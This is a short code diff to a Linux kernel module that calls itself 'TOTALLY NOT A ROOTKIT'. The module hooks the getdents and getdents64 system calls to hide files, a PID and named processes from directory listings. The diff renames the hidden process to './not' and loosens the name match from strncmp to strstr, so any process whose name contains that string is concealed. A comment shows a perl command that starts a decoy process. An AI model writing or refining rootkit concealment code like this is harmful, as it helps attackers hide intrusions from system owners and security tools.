@@ -43,7 +43,7 @@ MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 #define HIDE_FILE "secret"	//You can also hide processes by PID using HIDE_FILE if you want 
 #define HIDE_PID "9999"
-#define HIDE_PROCESS "dummy"
+#define HIDE_PROCESS "./not"
 // You can create a dummy process that runs and does nothing with this command: 
 // perl  -MPOSIX -e '$0="dummy"; pause' &
 
@@ -278,7 +278,7 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		}
 
 		is_proc_name_match = 0;
-		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
+		if ( strstr( buf, HIDE_PROCESS ) != NULL )
 			is_proc_name_match = 1;
 
 		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
@@ -352,7 +352,7 @@ asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, uns
 		}
 
 		is_proc_name_match = 0;
-		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
+		if ( strstr( buf, HIDE_PROCESS ) != NULL )
 			is_proc_name_match = 1;
 
 		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
